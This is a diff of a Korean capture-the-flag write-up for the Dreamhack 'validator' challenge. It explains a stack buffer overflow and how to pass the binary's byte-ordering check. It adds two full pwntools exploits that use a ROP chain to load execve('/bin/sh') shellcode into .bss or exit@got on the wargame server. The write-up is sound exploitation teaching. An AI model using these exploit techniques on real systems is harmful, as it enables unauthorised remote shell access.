@@ -37,11 +37,11 @@ Hint: 서버 환경에 설치된 5.4.0 이전 버전의 커널에서는, NX Bit�
 
 <img width="491" alt="image" src="https://github.com/user-attachments/assets/6d74f02b-2cf3-4313-9c3a-90ef36c8e052">
 
-이 부분을 살펴보면, `read()` 함수를 통해 `[rbp-0x80]`이 가리키는 주소에 `0x400` 크기의 데이터를 입력받기 때문에 **BOF** 취약점이 존재하는 것을 알 수 있고,
+이 부분을 살펴보면, `read()` 함수를 통해 `[rbp-0x80]`이 가리키는 주소에 `0x400` 크기의 데이터를 입력받기 때문에 **BOF** 취약점이 존재하는 것을 알 수 있고, 입력이 끝난 이후에는 `validate` 함수를 호출한다.
 
-입력이 끝난 이후에는 `validate` 함수를 호출한다.
+**BOF** 취약점이 존재하며, **canary**가 없기 때문에 **RAO** 공격이 가능할 것을 미리 생각해볼 수 있다.
 
-`diass validate` 명령어를 통해 해당 함수의 내용도 디스어셈블 해보며 관찰해봤는데, 위에서 `[rbp-0x80]`에 입력된 값과 특정값을 1바이트씩 계속 비교하며 반복해나가는 코드가 보였다.
+다시 돌아와서 `diass validate` 명령어를 통해 해당 함수의 내용도 디스어셈블 해보며 관찰해봤는데, 위에서 `[rbp-0x80]`에 입력된 값과 특정값을 1바이트씩 계속 비교하며 반복해나가는 코드가 보였다.
 
 만약 입력값과 특정값이 다르다면, `jmp`를 통해 `exit` 함수를 호출하며 종료하게 되었다.
 
@@ -163,17 +163,15 @@ __int64 __fastcall validate(__int64 a1, unsigned __int64 a2)
 
 `a1[j] != a1[j + 1] + 1`을 만족하는 경우 `exit(0);`를 호출하며 함수가 종료하게 된다.
 
-따라서 이 검증을 넘어가기 위해서는 인덱스 `11`부터 인자로 전달해준 `127`까지 서로 이웃한 인덱스의 원소는, 아스키 코드 값을 기준으로 `1`만큼 차이가 나도록 내림차순으로 저장되어야 한다.
-
-따라서, `main` 함수에서 호출되는 `read` 함수를 통한 입력해서 인덱스 11부터 127까지 저장되어야 하는 문자열은, Exploit 코드에서 반복문을 통해 127부터 11까지 아스키 값을 저장해주면 될 것이다.
+따라서 이 검증을 넘어가기 위해서는 인덱스 `11`부터 인자로 전달해준 `127`까지 서로 이웃한 인덱스의 원소는, 메모리에 저장된 바이트 값을 기준으로 `1`만큼 차이가 나도록 내림차순으로 저장되어야 한다.
 
 여기서 매우 주의할 점이, 마지막 인덱스인 `a1[127]`에서 `a1[128]`과 비교를 하기 때문에, `a[128]` 까지도 데이터를 입력해야 한다는 것이다. 
 
-따라서, **0부터 128**까지 **129바이트의 길이**의 데이터가 입력되야한다.
+따라서, `main` 함수에서 호출되는 `read` 함수를 통한 입력해서 **인덱스 11부터 128까지** 저장되어야 하는 문자열은, Exploit 코드에서 반복문을 통해 **127부터 10까지** 정수 값을 저장해주면 될 것이다.
+
+참고로, `read` 함수는 널 문자 또는 개행 문자를 만나도 입력을 계속 받기 때문에 입력 값의 범위는 `-128 ~ 127`에만 해당된다면 신경쓰지 않아도 된다. (내가 갑자기 헷갈렸어서)
 
 그리고 인덱스가 10인 부분은 검증하지 않기 때문에 아무 값이나 전달해줘도 되고, 이 부분을 놓치면 마지막 127번째 인덱스까지 채워지지 않기 때문에 이를 잘 유의하자.
-
-참고로, `read` 함수는 널 문자 또는 개행 문자를 만나도 입력을 계속 받기 때문에 아스키 코드 입력 값의 범위는 신경쓰지 않아도 된다. (내가 갑자기 헷갈렸어서)
 
 그럼 이제, `validator_dist` 바이너리에서 `validate` 함수를 통한 검증은 통과할 방법을 설계하였으니, 바이너리의 취약점을 분석해보며 Exploit 계획을 세워보자.
 
@@ -183,21 +181,23 @@ __int64 __fastcall validate(__int64 a1, unsigned __int64 a2)
 
 <img width="1115" alt="image" src="https://github.com/user-attachments/assets/f8c6c451-6021-4999-92fb-8526fa28f0c3">
 
-먼저, 해당 바이너리에는 **Partial RELRO**가 적용되어 있기 때문에 **GOT Overwrite**가 가능하며, 카나리도 존재하지 않아서 쉽게 **ROP** 공격이 가능하다.
+먼저, 해당 바이너리에는 **PIE**가 존재하지 않고 **Partial RELRO**가 적용되어 있기 때문에, 바이너리 베이스를 구하지 않고 쉽게 **GOT Overwrite**가 가능하며, 
+
+`read(0, s, 0x400)` 에서 **BOF** 취약점이 존재하고 카나리도 존재하지 않기 때문에, 쉽게 **ROP 가젯**을 활용한 **RAO** 공격이 가능하다.
 
 스택에는 실행 권한이 존재하긴 하지만, 예를 들어 `r2s` 워게임 문제와 다르게 스택의 주소를 출력해주는 부분이 없기 때문에, 쉘코드를 주입할 스택의 주소를 알 수 없다.
 
 따라서, 스택에 쉘코드를 주입하는 것 대신 **GOT Overwrite** 공격을 통해 문제를 풀이할 수 있다.
 
-그리고 참고로 이 문제의 설명을 보면, `5.4.0` 이전 버전의 커널에서는, `NX Bit`가 비활성화되어 있는 경우 읽기(`R`) 권한이 존재하는 메모리에 실행(`X`)권한이 존재한다고 되어있다.
+그리고 이 문제의 설명을 보면, `5.4.0` 이전 버전의 커널에서는, `NX Bit`가 비활성화되어 있는 경우 읽기(`R`) 권한이 존재하는 메모리에 실행(`X`)권한이 존재한다고 되어있다.
 
-따라서, 읽기 권한이 존재하는 `.bss` 주소에 쉘 코드를 주입하는 **Shellcode execute** 공격이 가능하다.
+따라서 **GOT Overwrite**뿐만 아니라, 읽기 권한이 존재하는 `.bss` 주소에 쉘 코드를 주입한 후 `bss` 주소로 Return하여 **Shellcode execute** 공격이 가능하다.
 
-결론적으로 처음에 아래의 3가지 Exploit 방법을 생각해봤다.
+결론적으로 처음에 아래의 Exploit 방법들을 생각해봤다.
 
-1. **ROP** 공격을 통해 `bss` 영역에 `shellcraft`를 활용한 쉘코드 Overwrite (`5.4.0` 이전의 버전에서만 가능)
+1. `bss` 영역에 `shellcraft`를 활용한 쉘코드 Overwrite (`5.4.0` 이전의 버전에서만 가능)
 
-2. **ROP**와 **GOT Overwrite** 공격을 통해, `exit@got`에 `shellcraft`를 활용한 쉘코드 Overwrite (버전에 상관없이 가능)
+2. **GOT Overwrite** 공격으로 `exit@got`에 `shellcraft`를 활용한 쉘코드 Overwrite (버전에 상관없이 가능)
 
 그럼 이제 아래에서 하나씩 Exploit을 수행해보자.
 
@@ -207,7 +207,7 @@ __int64 __fastcall validate(__int64 a1, unsigned __int64 a2)
 
 `[rbp-0x80]`에 저장된 `char c[128]` 배열의 인덱스 **0부터 9까지**는 `"DREAMHACK!"` 문자열이 저장되어야 하고,
 
-인덱스 **10**은 아무 값이나, 그리고 인덱스 **11부터 128까지**는 아스키 값이 1만큼 차이나도록 내림차순으로 작성하면 된다.
+인덱스 **10**은 아무 값이나, 그리고 인덱스 **11부터 128까지**는 메모리에 저장된 값이 `1`만큼 차이나도록 내림차순으로 작성하면 된다.
 
 인덱스를 꼭 **128**까지 입력해줘야 하는 것 기억하고, 그렇게 되면 **SFP**의 첫번째 바이트(LSB)에 값이 하나 더 들어가기 때문에,
 
@@ -222,32 +222,186 @@ payload = b"DREAMHACK!"  # index : 0 ~ 9
 payload += b'A'          # index : 10
 
 # index : 11 ~ 128 (s[128]에도 대입해줘야 s[127]의 비교에서 exit가 발생하지 않음)
-for i in range(127, 9, -1):   # 127 ~ 10 까지 -1씩 감소시키며 (128은 아스키코드 값이 없어서 127부터 해줘야함)
+for i in range(127, 9, -1):   # 127 ~ 10 까지 -1씩 감소시키며 (char 범위는 -128 ~ 127 이므로, 범위를 127부터 해줘야함)
     payload += bytes([i])     # 바이트 문자열로 변환
     # payload += p8(i)        # 이렇게 해도됨
 
-payload += b'a' * 0x7         # SFP
+payload += b'a' * 0x7         # SFP : 앞에서 SFP의 첫번째 바이트까지 넘어왔기 때문에 7바이트만 덮어야함
 ```
 
+SFP를 생각하기 까다롭기 때문에, 다음에 할 때는 그냥 인덱스 10부터 한번에 SFP까지 덮는 아래의 코드를 사용해도 된다.
+
+```
+payload = b"DREAMHACK!"  # index : 0 ~ 9
+
+# index : 10 ~ 128 + SFP -> 총 126 바이트
+for i in range(126, 0, -1):   # 127 ~ 1 까지 -1씩 감소시키며
+    payload += bytes([i])     # 바이트 문자열로 변환
+    # payload += p8(i)        # 이렇게 해도됨
+```
+
+그럼 **ROP**, **GOT Overwrite**, **Shellcode execute** 등 여러 방법으로 공격을 수행해보자.
+
+## 1. `bss` 영역에 `shellcraft`를 활용한 쉘코드 Overwrite (`5.4.0` 이전의 버전에서만 가능)
+
+**RAO** 공격을 통해 ROP 체인을 통해 `bss`의 주소에 `shellcraft`를 통해 찾은 **Shellcode**를 주입하여 임의의 쉘코드를 실행하는 방법으로 공격을 할 수 있다.
+
+앞에서도 계속 설명했지만 `5.4.0` 이전의 커널 버전에서만, 이번 바이너리에서처럼 **NX Bit**가 비활성화된 경우 읽기 권한이 존재하는 `bss` 영역에 실행 권한이 존재하여 **Shellcode execute**가 가능하다.
+
+ROP 가젯은 `pwntools`의 `find_gadget()` 함수를 쓰거나, 쉘에서 아래의 명령어로 구할 수 있다.
+
+```
+ROPgadget --binary validator_dist | grep 'pop rdi'
+```
+
+`bss` 영역의 주소는 **PIE**가 적용되어 있지 않기 때문에 `elf.bss()`를 통해 구할 수 있고, `shellcode`는 `shellcraft.execve("/bin/sh", 0, 0)` 또는 `shellcraft.sh()`을 사용하면 된다.
+
+그리고 `shellcraft`는 쉘 코드에 해당하는 어셈블리 코드를 문자열로 리턴하기 때문에, `asm` 함수를 통해 해당 어셈블리 코드를 머신 코드로 변환한 바이트 문자열로 변환해서 전달해야 한다.
+
+<img width="1207" alt="image" src="https://github.com/user-attachments/assets/84fd2394-beb5-4a27-a7b1-9cf7f23efe11">
+
+그럼 이제, **BOF** 취약점을 통해 가능한 **RAO** 공격과 **ROP 가젯**을 통해, 아래의 `read` 함수를 실행하도록 하고, `bss` 영역에 `shellcode`를 대입해준 후 `bss` 영역으로 이동하면 쉘코드가 실행될 것이다.
+
+```
+read(0, bss, len(shellcode))
+```
+
+전체 Exploit 코드는 아래와 같으며, `p.send()`를 보내기 전에 `sleep(0.5)`로 텀을 두지 않으면 쉘이 바로 종료되는 오류가 발생해서 이 부분을 주의하자.
+
+```
+from pwn import *
+
+context.arch = "amd64"
+
+p = remote('host3.dreamhack.games', 9820)
+elf = ELF('./validator_server')
+r = ROP(elf)
 
 
+# [1] validate
+
+payload = b"DREAMHACK!"  # index : 0 ~ 9
+payload += b'A'          # index : 10
+
+# index : 11 ~ 128 (s[128]에도 대입해줘야 s[127]의 비교에서 exit가 발생하지 않음)
+for i in range(127, 9, -1):   # 127 ~ 10 까지 -1씩 감소시키며 (char 범위는 -128 ~ 127 이므로, 범위를 127부터 해줘야함)
+    payload += bytes([i])     # 바이트 문자열로 변환
+    # payload += p8(i)        # 이렇게 해도됨
+
+payload += b'a' * 0x7         # SFP : 앞에서 SFP의 첫번째 바이트까지 넘어왔기 때문에 7바이트만 덮어야함
+
+# index : 10 ~ 128 + SFP -> 총 126 바이트
+# for i in range(126, 0, -1):  # 127 ~ 1 까지 -1씩 감소시키며
+#     payload += bytes([i])     # 바이트 문자열로 변환
+#     # payload += p8(i)        # 이렇게 해도됨
+
+print(len(payload))
+
+# [2] ROP
+pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi_pop_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
+pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]
+# ret = r.find_gadget(['ret'])[0]
+
+shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
+# shellcode = asm(shellcraft.sh()) # 이것도 사용 가능
+bss = elf.bss()
+
+read_plt = elf.plt['read']
+
+# payload += p64(ret)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi_pop_r15) + p64(bss) + p64(0)
+payload += p64(pop_rdx) + p64(len(shellcode))
+payload += p64(read_plt)
+
+payload += p64(bss)
+
+# main의 read
+sleep(0.5)
+p.send(payload)
+
+# ROP의 read
+sleep(0.5)
+p.send(shellcode)
+
+p.interactive()
+```
+
+## 2. GOT Overwrite 공격으로 `exit@got`에 `shellcraft`를 활용한 쉘코드 Overwrite (버전에 상관없이 가능)
+
+바로 앞의 방식에서, `bss` 영역에 `shellcode`를 Overwrite하는 대신 바이너리에 존재하는 `exit@got`에 `shellcode`를 Overwrite 하면 된다.
+
+이번 문제는 **PIE**도 적용되어있지 않기 때문에, **GOT Overwrite**를 위해 PIE base를 구해주지 않아도 되서 거의 같은 난이도로 풀이가 가능하다.
+
+익스플로잇 코드는 아래와 같고, `bss`를 `exit@got`로 바꿔주면 끝이다. 
+
+참고로, 어쩌피 `exit@got`가 아니라 `read@got`로 해줘도 Overwrite 이후에 `read` 함수가 사용되지 않기 때문에 공격이 가능하다. 
+
+주의할 점은 `got`가 아닌 `plt`를 마지막에 호출해주거나, 똑같은 논리로 어쩌피 마지막에 `exit`가 호출될 것이기 때문에 `exit@got`로 Return하는 코드를 없애면 Exploit이 불가능하다.
+
+그 이유는 나중에 정확히 알아보고 추가하겠지만, `got`로 이동하면 바로 해당 주소에 저장되어 있는 쉘코드를 실행할 수 있지만, `plt`로 이동하면 `got`를 거치는 과정에서 레지스터 인자값을 설정해주면서 오류가 발생해서라고 생각하고 있다.
+
+`rop` 문제에서 `plt`로 Return할 때 `system` 함수의 인자를 따로 설정해준 것에서 떠올린 예측이다.
+
+```
+from pwn import *
+
+context.arch = "amd64"
+
+p = remote('host3.dreamhack.games', 9820)
+elf = ELF('./validator_server')
+r = ROP(elf)
 
 
+# [1] validate
 
+payload = b"DREAMHACK!"  # index : 0 ~ 9
+payload += b'A'          # index : 10
 
+# index : 11 ~ 128 (s[128]에도 대입해줘야 s[127]의 비교에서 exit가 발생하지 않음)
+for i in range(127, 9, -1):   # 127 ~ 10 까지 -1씩 감소시키며 (char 범위는 -128 ~ 127 이므로, 범위를 127부터 해줘야함)
+    payload += bytes([i])     # 바이트 문자열로 변환
+    # payload += p8(i)        # 이렇게 해도됨
 
+payload += b'a' * 0x7         # SFP : 앞에서 SFP의 첫번째 바이트까지 넘어왔기 때문에 7바이트만 덮어야함
 
+# index : 10 ~ 128 + SFP -> 총 126 바이트
+# for i in range(126, 0, -1):  # 127 ~ 1 까지 -1씩 감소시키며
+#     payload += bytes([i])     # 바이트 문자열로 변환
+#     # payload += p8(i)        # 이렇게 해도됨
 
+print(len(payload))
 
+# [2] ROP
+pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi_pop_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
+pop_rdx = r.find_gadget(['pop rdx', 'ret'])[0]
+# ret = r.find_gadget(['ret'])[0]
 
+shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
+# shellcode = asm(shellcraft.sh()) # 이것도 사용 가능
 
+exit_plt = elf.plt['exit']
+exit_got = elf.got['exit']
 
+read_plt = elf.plt['read']
 
+# payload += p64(ret)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi_pop_r15) + p64(exit_got) + p64(0)
+payload += p64(pop_rdx) + p64(len(shellcode))
+payload += p64(read_plt)
 
+payload += p64(exit_got)
 
+# main의 read
+sleep(0.5)
+p.send(payload)
 
+# ROP의 read
+sleep(0.5)
+p.send(shellcode)
 
-
-
-
-
+p.interactive()
+```
